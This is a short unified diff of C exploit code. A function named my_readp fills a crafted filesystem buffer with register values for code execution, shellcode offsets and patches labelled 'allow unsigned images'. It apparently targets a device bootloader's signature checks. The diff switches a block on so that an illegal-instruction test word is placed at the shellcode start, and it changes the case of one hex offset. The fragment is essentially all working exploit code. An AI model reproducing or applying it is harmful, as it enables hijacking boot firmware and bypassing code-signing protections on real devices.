@@ -500,8 +500,8 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 
                 PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x40 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + START_OF_SHELLCODE + 1);    /* r10 (code exec) */ //todo
                 PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x44 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x447FC);    /* r11 -> lr */ //todo
-#if 0
-                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0 - START_OF_EXTENTS_BTREE_HEADER, INSNT_ILLEGAL);
+#if 1
+                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0x0 - START_OF_EXTENTS_BTREE_HEADER, INSNT_ILLEGAL);
 #else
 #if SHELLCODE
                 /* SHEELCODE */
@@ -538,7 +538,7 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  96 - START_OF_EXTENTS_BTREE_HEADER, 0x19164 /* allow unsigned images */); //should be right
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 100 - START_OF_EXTENTS_BTREE_HEADER, INSN2_MOV_R0_0__STR_R0_R3 /* allow unsigned images */);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 104 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x48000 /* nettoyeur uncompressed */);
-                PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 108 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x47d3c /* nettoyeur compressed */);
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 108 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x47D3C /* nettoyeur compressed */);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 112 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)suck_sid);
                 /* END */
 #else
